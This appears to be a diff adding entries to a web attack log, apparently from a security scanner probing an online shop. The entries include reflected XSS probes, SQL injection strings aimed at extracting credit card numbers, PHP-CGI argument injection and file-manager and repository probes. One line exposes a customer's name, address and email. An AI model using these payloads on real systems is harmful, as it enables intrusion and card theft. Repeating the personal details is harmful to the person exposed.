+attack:5  /lib/editor/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000128')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000058')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000026')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FD')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders where LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C4')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000057')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000091')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000087')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F7')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004E')</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000107')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001F')</script>
+attack:5  /phpslash/-0/.7/.1/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A6')</script>
+attack:5  /Scripts/modernizrbundle?<script>alert('TK00000119')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000072')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000060')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000016')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D7')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000045')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000034')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000097')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000010')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000059')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D6')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000088')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000068')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000095')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B2')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK00000110')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008E')</script>
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000106')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006C')</script>
+attack:5  /cgi-bin/php4?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008F')</script>
+attack:5  /lib/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000070')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000086')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000062')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000065')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000096')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000027')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000077')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000041')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DF')</script>
+attack:5  /bdgdb/file_manager.php?goto=C:/Repository/Web/REDACTED.com//download
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000074')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000042')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004D')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000030')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000039')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000056')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A7')</script>
+attack:5  /SMSReporting_XYZ/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000022')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000040')</script>
+attack:5  /$.extend({},
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000012')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002B')</script>
+attack:5  /phpslash/-0/.61/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000105')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000051')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK0000011E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DB')</script>
+attack:5  /Content/themes/base/cssbundle?<script>alert('TK00000109')</script>
+attack:5  /admin/spaw2/dialogs/dialog.php?module=spawfm&dialog=spawfm&theme=spaw2lite&type=imagesundefined
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000115')</script>
+attack:5  /bdgdb/file_manager.php?goto=C:/Repository/Web/REDACTED.com//templates
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000081')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000A')</script>
+attack:5  /Error/NotFound?<script>alert('TK00000006')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000035')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000052')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000038')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000019')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000055')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000061')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000023')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000050')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000092')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D0')</script>
+attack:5  /phpslash/-0/.6/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /phpslash/-0/.6/.2/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000009')</script>
+attack:5  /Home/Index?<script>alert('TK0000012A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000ED')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E5')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000078')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000125')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000080')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000064')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000054')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000093')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B9')</script>
+attack:5  /_utils/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000073')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000083')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000047')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009E')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B7')</script>
+attack:5  /phpslash/-0/.6/.5/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Express/default.aspx?partnerId=REDACTEDSTSP00001&sfn=Terry&sln=Kellum&sa1=2329 Dahlen Ave&sa2=Attn: Merc 1508&sc=Terre Haute&ss=IN&sz=47805&se=bob.kellum@gmail.com&t==RzJoUWwremdyOFJidWhNSCt0VWJIaExHV1F3b3V4Z1Y=
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 0,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000037')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 3,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F2')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000031')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F6')</script>
+attack:5  /includes/spaw/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DC')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010F')</script>
+attack:5  /Content/themes/base/cssbundle?v=<script>alert('TK0000010E')</script>
+attack:5  /Scripts/jquerybundle?<script>alert('TK00000111')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003F')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000029')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000036')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000028')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FC')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B1')</script>
+attack:5  /Scripts/jquerybundle?<script>alert('TK00000112')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000B')</script>
+attack:5  /Content/css/cssbundle?<script>alert('TK00000101')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000066')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000067')</script>
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000118')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000011')</script>
+attack:5  /Content/css/cssbundle?<script>alert('TK00000102')</script>
+attack:5  /admin/?-d allow_url_include=1 -d safe_mode=0 -d suhosin.simulation=1 -d disable_functions="" -d open_basedir=none -d auto_prepend_file=php://input
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E7')</script>
+============================================
+csrf Attack: Cross-Site Request Forgery 
+
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002D')</script>
+attack:6  /change_payment_card.php?order_id=51465722 and(select 1 from(select count(*),concat((select (select concat(payment_cards_id,"|",customers_id,"|",cc_type,"|",cc_number_display,"|",cc_expires,"|",address_book_id)) from bdgweb_oscsmartsubinnodb.payment_cards order by payment_cards_id desc limit 0,1),floor(rand(0)*2))x from bdgweb_oscsmartsubinnodb.payment_cards group by x)a) and 1=1--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000046')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000090')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000025')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000013')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000089')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D2')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(customers_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000117')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D9')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008B')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_mem_bin/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A3')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000004C')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(payment_cards_id,":",cc_number) FROM orders LIMIT 7,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C6')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_derived/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000085')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.8.1/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A4')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000033')</script>
+attack:5  /include/editor/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000075')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001D')</script>
+attack:5  /Scripts/customjsbundle?<script>alert('TK00000122')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000024')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006D')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.2/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000084')</script>
+attack:5  /Error/.svn/entries
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_errors/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AF')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000000C')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000032')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000079')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000044')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000082')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BA')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000069')</script>
+attack:5  /Error/NotFound?<script>alert('TK00000005')</script>
+attack:5  /Error/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E0')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000014')</script>
+attack:5  /Scripts/modernizrbundle?v=<script>alert('TK00000120')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000094')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000126')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A1')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000098')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000BB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000008D')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/.cobalt/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000A8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000021')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000048')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007E')</script>
+attack:5  /<script>alert('TK00000002')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007D')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000053')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000009C')</script>
+attack:5  /_archive/.svn/entries
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/.cobalt/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DE')</script>
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where customers_id = 18400099 LIMIT 7,1)))--
+attack:5  /Content/css/cssbundle?v=<script>alert('TK00000108')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000076')</script>
+attack:5  /SMSReporting_XYZ/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000003E')</script>
+attack:6  /modules/Submit/index.php?op=pre&title=<script>alert("test");</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000020')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000017')</script>
+attack:5  /$(el).attr(
+attack:5  /_derived/.svn/entries
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C7')</script>
+attack:6  /corporate_info.php?content=corp_mgt' aND BeNChMaRK(2999999,Md5(NoW())) AnD '1
+attack:5  /_backup/.DS_Store
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000006E')</script>
+attack:5  /Scripts/jquerybundle?v=<script>alert('TK00000116')</script>
+attack:5  /lib/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_archive/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000C5')</script>
+attack:5  /Home/Index?<script>alert('TK00000129')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.1/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000002C')</script>
+attack:5  /_errors/.DS_Store
+attack:5  /Scripts/modernizrbundle?<script>alert('TK0000011A')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.8/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /change_payment_card.php?order_id=1 AND extractvalue(rand(),concat(":",(SELECT concat(":",cc_number) FROM orders where payment_cards_id = 0 LIMIT 964175,1)))--
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000100')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000FE')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_pages/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_objects/<script>document.cookie="testxjwa=7156;"</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/phpslash-0.6.1/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000D8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000018')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000DD')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000CB')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000AE')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000043')</script>
+attack:5  /Scripts/customjsbundle?<script>alert('TK00000121')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000007A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000E8')</script>
+attack:6  /calendar.php?year=2011&month="<script>alert("Trustkeeper")</script>&day=01
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000015')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000005B')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000099')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000063')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B8')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK00000071')</script>
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/SMSReporting_XYZ/<meta http-equiv=Set-Cookie content="testxjwa=7156">
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK0000001A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000EA')</script>
+attack:5  /Content/themes/base/cssbundle?<script>alert('TK0000010A')</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000B6')</script>
+attack:5  /Scripts/customjsbundle?v=<script>alert('TK00000127')</script>
+attack:5  /include/spaw2/dialogs/dialog.php?module=spawfm&dialog=spafm
+attack:6  /https:/gsnutsandchocolates.com/Error/NotFound?aspxerrorpath=/_old/<script>document.cookie="testxjwa=7156;"</script>
+attack:5  /Error/NotFound?aspxerrorpath=<script>alert('TK000000F0')</script>
+attack:5  /Nut/Home/SwitchView?mobile=False&returnUrl=/Nut/Error/Unknown?aspxerrorpath=/nut/landing/0/b5cefd32-43ce-4541-9765-c05f5f36765d%3Chttp:/links.m2mediagroup.mkt5971.com/ctt
